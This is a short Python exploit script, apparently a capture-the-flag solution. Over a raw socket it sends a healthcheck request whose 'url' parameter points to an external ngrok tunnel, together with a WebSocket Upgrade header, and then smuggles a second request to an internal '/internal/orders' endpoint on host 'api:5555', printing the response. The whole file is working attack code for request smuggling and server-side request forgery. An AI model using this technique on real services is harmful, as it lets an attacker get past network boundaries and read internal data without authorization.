import socket

req1 = '''GET /api/healthcheck/?url=http://0.tcp.eu.ngrok.io:16995/localhost HTTP/1.1
Host: 0.0.0.0:8000
Upgrade: WebSocket
Connection: Upgrade

'''


req2 = '''GET /internal/orders HTTP/1.1
Host: api:5555

'''


def main(netloc):
    host, port = netloc.split(':')

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, int(port)))

    sock.sendall(req1.encode())
    sock.recv(4096)

    sock.sendall(req2.encode())

    while True:
        data = sock.recv(409600000)
        data = data.decode(errors='ignore')

        print(data)

        if data == "\r\n\r\n":
            break

    sock.shutdown(socket.SHUT_RDWR)
    sock.close()


if __name__ == "__main__":
    main('0.0.0.0:8000')